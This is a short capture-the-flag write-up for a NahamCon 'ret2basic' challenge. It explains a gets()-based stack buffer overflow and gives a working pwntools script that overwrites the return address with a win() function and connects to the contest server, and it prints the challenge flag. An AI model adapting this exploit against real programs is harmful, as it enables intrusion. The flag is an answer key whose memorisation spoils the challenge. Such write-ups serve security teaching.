# ret2basic
---
Can you ret2win?

Download the file below and press the Start button on the top-right to begin this challenge.
Connect with:

nc challenge.nahamcon.com 30111

# Solver
---
Diberikan sebuah binary dimana binary tersebut menggunakan ```gets()``` untuk menerima input dari user. Hali ini vuln buffer overflow. Tinggal saya cari offset lalu RSP saya masukkan fungsi ```0000000000401215 <win>``` untuk mendapatkan flag
```
from pwn import *
chall = ELF("./chall")
p = process("./chall")
#nc challenge.nahamcon.com 30111
p = remote("challenge.nahamcon.com", 30111)
pattern = "A"*cyclic_find("faab")
#0000000000401215 <win>:
flag = p64(0x0000000000401215)
p.recvuntil("Can you overflow this?: ")
#raw_input("GDB gan")
p.sendline(pattern + flag)
p.interactive()
```
#### flag{d07f3219a8715e9339f31cfbe09d6502}
